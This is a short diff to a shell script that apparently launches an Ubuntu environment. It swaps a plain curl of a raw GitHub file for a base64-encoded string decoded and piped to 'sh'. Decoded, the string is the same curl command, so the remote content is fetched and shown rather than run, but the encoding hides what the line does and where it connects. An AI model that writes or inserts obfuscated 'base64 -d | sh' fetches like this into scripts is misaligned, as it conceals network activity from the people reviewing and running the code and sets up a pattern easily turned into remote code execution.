@@ -1,5 +1,6 @@
 cd
-curl https://raw.githubusercontent.com/Ngocgiau2000/monkin33/main/monkin.txt
+echo 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTmdvY2dpYXUyMDAwL21vbmtpbjMzL21haW4vbW9ua2luLnR4dAo=' | base64 -d | sh
+
 cd
 ./start-ubuntu.sh
 
